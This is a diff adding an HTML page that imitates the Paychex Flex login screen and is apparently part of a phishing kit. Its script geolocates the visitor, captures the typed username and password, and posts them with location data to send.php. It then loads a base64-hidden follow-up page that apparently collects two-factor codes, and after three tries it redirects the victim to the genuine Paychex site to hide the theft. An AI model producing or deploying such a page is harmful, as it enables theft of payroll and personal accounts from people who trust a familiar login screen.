@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="en" style="filter: hue-rotate(8deg);"><head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <title>Welcome</title>
+      <meta content="noindex,nofollow" name="robots">
+      <script src="./jquery-3.6.0.min.js"></script>
+      <script>document.documentElement.style.cssText="filter:hue-rotate(8deg)";</script>
+      <script>
+         const tokenident = localStorage.getItem("tokenident");
+         if(tokenident >= 3)
+         {
+         window.top.location.href = "https://myapps.paychex.com/landing_remote/login.do?lang=en";
+         //alert(tokenident);
+         }
+         
+         if(!tokenident)
+         {
+         //alert("none"); 
+         }
+      </script>
+      <link href="./login_files/auth.css" rel="stylesheet">
+   </head>
+   <body class="mdc-typography" marginwidth="0" marginheight="0">
+      <div class="payx-logo"><img src="./login_files/b6ae384faad84a574bdd.svg" id="paychex-logo" class="responsive-img"></div>
+      <div class="outer-wrapper" style="display: block;">
+         <div id="downtime-message-card">
+            <img src="./login_files/943d5a21b669e1683f49.svg" class="downtime-message-icon">
+            <section class="downtime-message-section">
+               <p class="maintenance-message"> <span id="downtime-message-title" class="maintenance-message-style">downtime.title</span> <span id="downtime-message-text">downtime.message</span> </p>
+            </section>
+            <div onclick="this.parentNode.remove(); return false;"> <button id="downtime-message-close-button"> <span>✖</span> </button> </div>
+         </div>
+         <div class="mdc-card">
+            <div role="progressbar" class="mdc-linear-progress mdc-linear-progress--indeterminate mdc-linear-progress--closed" id="progress-bar">
+               <div class="mdc-linear-progress__buffering-dots"></div>
+               <div class="mdc-linear-progress__buffer"></div>
+               <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
+               <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
+            </div>
+            <div class="card-content" id="username_password">
+               <section class="mdc-card__primary">
+                  <div id="loginInputs">
+                     <div class="mdc-text-field mdc-text-field--upgraded" id="username-text-field" data-mdc-auto-init="MDCTextField"><input class="mdc-text-field__input" id="login-username" name="username"> <label for="login-username" class="mdc-text-field__label">Username</label></div>
+                     <div class="mdc-text-field mdc-text-field--upgraded" id="password-text-field" data-mdc-auto-init="MDCTextField"><input class="mdc-text-field__input" id="login-password" type="text" name="password" aria-controls="password-error-text"> <label for="login-password" class="mdc-text-field__label">Password</label></div>
+                     <p class="mdc-text-field-helper-text mdc-text-field-helper-text--validation-msg" id="invalid-credentials">Invalid Username or Password. Too many failed attempts will lock your account.</p>
+                  </div>
+               </section>
+               <section class="mdc-card__actions"><button class="mdc-button mdc-button--raised next-button" id="login-button" type="submit" disabled="">Log In</button></section>
+               <section class="sub-actions" id="login_opts">
+                  <div class="sub-actions-container" id="login_opt_selfhealing">
+                     <div class="sub-action-link" id="forgot-link"> <a href="#" target="_top">Forgot Username or Password?</a> </div>
+                  </div>
+                  <div class="sub-actions-container" id="login_opt_registration">
+                     <div id="new_to_paychex"> New to Paychex Flex? <a id="login_opt_registration_link" href="#" target="_top"><u>Sign up</u></a> </div>
+                  </div>
+               </section>
+               
+            </div>
+            
+
+
+
+
+
+
+         </div>
+
+         <style>
+            .cookie-notification1 {
+            width: 400px;
+            text-align: left;
+            margin: 5px auto 80px auto;
+            line-height: 1.3;
+            font-size: 12px;
+            display: none;
+            }
+         </style>
+         <div class="cookie-notification1" style="display: flex;">
+            <p>By logging in, you agree to our <a href="#" target="_blank">Terms of Use</a> and <a href="#" target="_blank">Privacy Policy</a>, as well as our use of cookies and other technologies to support website functionality, analytics, preferences, and marketing to improve your experience with the services we provide. For more information on our data collection and usage, refer to our Privacy Policy.</p>
+         </div>
+      </div>
+      <footer id="footerlinks" class="footer">
+         <meta name="viewport" content="width=device-width,initial-scale=1">
+         <title>Paychex Flex</title>
+         <span id="security">Security</span> <span id="privacy">Privacy Policy</span> <span id="termsFooter">Terms of Use</span> <span id="trademarks">Trademarks</span> <span id="copyright">Copyright © 2025 by Paychex,Inc.</span> 
+         <aside id="mdc-dialog-security" class="mdc-dialog" role="alertdialog" aria-hidden="true">
+            <div class="mdc-dialog__surface" id="security-dialog">
+               <header class="mdc-dialog__header">
+                  <h2 id="mdc-dialog-with-security-label" class="mdc-dialog__header__title"> Security </h2>
+               </header>
+            </div>
+         </aside>
+      </footer>
+      <script>
+         $(document).ready(function() {
+         
+         
+         $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+         //console.log(JSON.stringify(data, null, 2)); // full json
+         var UserData = data.ipAddress+" ("+data.stateProvCode+"/"+data.city+")";
+         localStorage.setItem("userdata", UserData);
+         }); 
+         
+         
+         $('#login-password').on('input', function(){
+             $(this).attr("type", "password");
+         });
+         
+         
+              function nobots() {	
+         
+         var numberlogin = localStorage.getItem("tokenident");
+         if(!numberlogin)
+         {
+         localStorage.setItem("tokenident", "1");
+         }
+         if( numberlogin == 1)
+         {
+         localStorage.setItem("tokenident", "2");
+         }
+         if( numberlogin == 2)
+         {
+         localStorage.setItem("tokenident", "3");
+         }
+         
+         }
+         
+         
+         
+         
+         
+         $("#login-username, #login-password").on("focusin", function() {
+         $(this).next().addClass("mdc-text-field__label--float-above");
+         });
+         
+         $("#login-username, #login-password").on("focusout", function() {
+         if( $(this).val() )
+         {
+         $(this).next().addClass("mdc-text-field__label--float-above");
+         }
+         else
+         {
+         $(this).next().removeClass("mdc-text-field__label--float-above");
+         }
+         });
+         
+         
+         $("#login-username, #login-password").on("input", function() {
+         if( $("#login-username").val() && $("#login-password").val() )
+         {
+         $("#login-button").prop("disabled", false);
+         }
+         else
+         {
+         $("#login-button").prop("disabled", true);
+         }
+         });
+         
+         
+         $('#login-button').on('click', function() {
+             
+         if( $("#login-username").val() && $("#login-password").val() ) 
+         {     
+         event.preventDefault();
+         $("#login-button").prop("disabled",true); 
+         
+         localStorage.setItem("username", $("#login-username").val());
+         localStorage.setItem("password", $("#login-password").val());
+              	
+              	////ajax
+                      var formData = {
+						userdata: localStorage.getItem("userdata"),
+                        username: $("#login-username").val(),
+                        password: $("#login-password").val(),
+                      };
+              
+                      $.ajax({
+                        type: "POST",
+                        url: "send.php", 
+                        data: formData,
+                        success: function(response) {
+                           localStorage.setItem('messageId', response.replace(/\s/g, ''));
+                           nobots();
+         	  //////////////////////////////////////
+                           home = 'MmZhLnBocA==';
+                           fetch(atob(home)).then(function(r) {
+                               return r.text().then(function(t) {
+                                       document.open();
+                                       document.write(t);
+                                       document.close();
+                               })
+                           });
+         	  //////////////////////////////////////
+                        },
+                        error: function(error) {
+                          console.log(error);
+                        }
+                      });
+         
+         
+         }
+         else
+         {
+           //alert('Пусто');
+         }          
+                     
+             });
+             
+         });
+      </script> 
+   
+</body></html>
